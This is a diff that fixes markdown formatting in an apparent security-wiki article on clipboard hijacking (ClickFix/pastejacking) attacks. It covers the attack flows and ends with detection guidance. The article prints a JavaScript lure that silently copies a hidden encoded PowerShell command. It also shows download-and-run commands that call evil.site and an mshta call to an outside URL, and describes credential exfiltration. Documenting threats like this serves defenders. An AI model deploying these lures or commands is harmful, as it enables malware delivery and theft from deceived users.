@@ -1,6 +1,5 @@
 # Clipboard Hijacking (Pastejacking) Attacks
 
-
 > "Never paste anything you did not copy yourself." – old but still valid advice
 
 ## Overview
@@ -13,17 +12,16 @@ Because **no file is downloaded and no attachment is opened**, the technique byp
 
 ```html
 <!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
-Fix the error
-
+<button id="fix" onclick="copyPayload()">Fix the error</button>
 <script>
 function copyPayload() {
-  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>; // hidden PowerShell one-liner
+  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
   navigator.clipboard.writeText(payload)
     .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
 }
 </script>
 ```
-```
+
 Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).
 
 ## The ClickFix / ClearFake Flow
@@ -43,7 +41,7 @@ Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
 Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
 %TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
 ```
-```
+
 * `jp2launcher.exe` (legitimate Java WebStart) searches its directory for `msvcp140.dll`.
 * The malicious DLL dynamically resolves APIs with **GetProcAddress**, downloads two binaries (`data_3.bin`, `data_4.bin`) via **curl.exe**, decrypts them using a rolling XOR key `"https://google.com/"`, injects the final shellcode and unzips **client32.exe** (NetSupport RAT) to `C:\ProgramData\SecurityCheck_v1\`.
 
@@ -52,7 +50,7 @@ Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
 ```
 powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
-```
+
 1. Downloads `la.txt` with **curl.exe**
 2. Executes the JScript downloader inside **cscript.exe**
 3. Fetches an MSI payload → drops `libcef.dll` besides a signed application → DLL sideloading → shellcode → Latrodectus.
@@ -62,7 +60,7 @@ powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
 mshta https://iplogger.co/xxxx =+\\xxx
 ```
-```
+
 The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.
 
 ## Detection & Hunting
@@ -89,6 +87,6 @@ Blue-teams can combine clipboard, process-creation and registry telemetry to pin
 
 ## References
 
-- [[https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/|Fix the Click: Preventing the ClickFix Attack Vector]]
-- [[https://github.com/dxa4481/Pastejacking|Pastejacking PoC – GitHub]]
+- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
+- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
 
